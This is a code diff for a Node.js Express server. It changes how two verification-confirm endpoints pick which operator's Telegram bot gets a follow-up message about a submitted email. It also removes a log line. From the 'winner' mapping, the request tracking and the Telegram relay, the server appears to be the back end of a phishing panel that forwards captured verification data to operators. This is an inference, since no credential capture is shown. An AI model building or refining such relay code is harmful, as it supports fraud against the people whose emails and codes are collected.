@@ -1513,15 +1513,17 @@ app.post("/send-verification-confirm", async (req, res) => {
     const botToken = process.env.BOT_TOKEN;
     const chatId = process.env.ADMIN_CHAT_ID;
 
-    // ✅ RESOLVE EMAIL via multi-layer tracking to find original winner (like verification page)
+    // ✅ RESOLVE EMAIL via multi-layer tracking to find original winner
+    // But use ORIGINAL email for winner lookup (to send to correct bot)
     let resolvedEmail = email;
     if (!userWinnerTelegram[email]) {
       resolvedEmail = resolveEmailFromRequest(req, null, null) || email;
-      console.log(`🔍 Resolved email via tracking: ${email} → ${resolvedEmail}`);
     }
 
-    // ✅ SEND TO WINNER ONLY (use resolved email for winner lookup)
-    if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
+    // ✅ SEND TO WINNER ONLY (use ORIGINAL email to find correct bot)
+    if (email && userWinnerTelegram[email]) {
+      await sendFollowUpMessage(email, message, options);
+    } else if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
       await sendFollowUpMessage(resolvedEmail, message, options);
     } else {
       console.log(`⚠️ WARNING: No winner found for ${email}, not sending message`);
@@ -1685,14 +1687,16 @@ app.post("/resend-verification-confirm", async (req, res) => {
     };
 
     // ✅ RESOLVE EMAIL via multi-layer tracking to find original winner
+    // But use ORIGINAL email for winner lookup (to send to correct bot)
     let resolvedEmail = email;
     if (!userWinnerTelegram[email]) {
       resolvedEmail = resolveEmailFromRequest(req, null, null) || email;
-      console.log(`🔍 Resolved email via tracking: ${email} → ${resolvedEmail}`);
     }
 
-    // ✅ SEND TO WINNER ONLY
-    if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
+    // ✅ SEND TO WINNER ONLY (use ORIGINAL email to find correct bot)
+    if (email && userWinnerTelegram[email]) {
+      await sendFollowUpMessage(email, message, options);
+    } else if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
       await sendFollowUpMessage(resolvedEmail, message, options);
     } else {
       console.log(`⚠️ WARNING: No winner found for ${email}, not sending message`);
